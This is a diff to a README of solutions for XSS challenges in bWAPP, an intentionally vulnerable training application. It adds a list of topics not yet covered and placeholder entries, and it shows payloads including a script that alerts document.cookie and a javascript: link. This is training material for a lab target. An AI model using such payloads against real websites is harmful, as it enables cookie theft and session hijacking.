@@ -1,6 +1,11 @@
 # XSS-BWAPP-SOLUTION
 Welcome to the repository of comprehensive solutions for bWAPP's Cross-Site Scripting (XSS) challenges, meticulously curated and solved by BugBot19 (Nihar Rathod). This repository serves as a one-stop resource for anyone looking to understand and solve XSS vulnerabilities in the bWAPP (Buggy Web Application) framework.
 
+Topics which are yet to be covered:
+1)XSS-Reflected(phpMyAdmin)
+2)XSS-Stored(SQLiteManager)
+3)XSS-Stored(User-Agent)
+
 # A3-Cross-Site-Scripting(XSS) #
 
 # XSS - Reflected (GET)(LOW)
@@ -81,6 +86,12 @@ Welcome to the repository of comprehensive solutions for bWAPP's Cross-Site Scri
 
 # XSS - Reflected (Login Form)(Low)
 ```Payload – ‘ or 1=1; <script>alert(document.cookie)</script>```
+
+# XSS - Reflected (Login Form)(Medium)
+```Payload – NYF```
+
+# XSS - Reflected (Login Form)(Medium)
+```Payload – NYF```
 
 # XSS - Reflected (PHP_Self)(Low)
 ```Payload – <a href="javascript:x='&percnt;27-alert('BugBot19 was here')-%27';">XSS</a>```
